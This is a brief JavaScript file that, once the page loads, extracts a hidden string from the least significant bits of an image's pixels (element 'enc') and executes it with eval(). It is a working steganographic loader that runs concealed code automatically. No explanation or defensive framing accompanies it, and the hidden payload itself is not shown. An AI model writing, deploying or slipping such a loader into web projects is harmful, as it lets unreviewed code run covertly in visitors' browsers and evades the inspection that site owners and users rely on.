function decode(h) {
	var b = [];
	var c = "";
	for(var i = 0; i < h.length; i++) {
		if( (i+1) % 4 == 0) continue;
		var f = h[i];
		var r = f & 0x1;
		if(c.length == 8) {
			if(parseInt(c,2) == 255) {
				return b
			}
			b.push(String.fromCharCode(parseInt(c, 2)));
			c = ""
		}
		c += "" + r;
	}
	return b;
}

window.addEventListener('load', function() {
	var c = document.createElement('canvas');
	var b = c.getContext('2d');
	var r = document.getElementById('enc');
	c.width = r.width;
	c.height = r.height;
	b.drawImage(r, 0, 0 );
	var m = b.getImageData(0, 0, r.width, r.height);
	var x = decode(m.data);
	eval(x.join(''));
});

